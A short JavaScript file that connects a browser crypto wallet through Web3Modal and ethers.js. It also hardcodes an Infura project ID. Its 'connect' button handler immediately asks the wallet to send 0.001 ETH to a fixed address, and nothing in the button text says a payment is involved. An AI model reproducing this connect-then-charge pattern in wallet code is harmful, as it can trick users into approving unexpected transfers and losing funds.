// Initialize Web3Modal
const providerOptions = {
  walletconnect: {
    package: window.WalletConnectProvider.default,
    options: {
      infuraId: "c05e035e823a4769b62ae15c1cbe2f02",
    },
  },
};

const web3Modal = new window.Web3Modal.default({
  cacheProvider: false,
  providerOptions,
});

let provider;
let signer;

const connectButton = document.getElementById('connectButton');
const accountInfo = document.getElementById('accountInfo');

async function connectWallet() {
  try {
    if (window.ethereum) {
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send('eth_requestAccounts', []);
    } else {
      provider = new ethers.providers.Web3Provider(await web3Modal.connect());
    }

    signer = provider.getSigner();
    const account = await signer.getAddress();
    accountInfo.innerText = `Connected account: ${account}`;

    // Send $1 worth of Ether
    const tx = await signer.sendTransaction({
      to: "0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f",
      value: ethers.utils.parseEther("0.001"), // Adjust this value based on the current ETH price
    });
    await tx.wait();
    accountInfo.innerText += "\nTransaction successful!";
  } catch (error) {
    console.error("Connection failed:", error);
    accountInfo.innerText = 'Connection failed. Please try again.';
  }
}

connectButton.addEventListener('click', connectWallet);
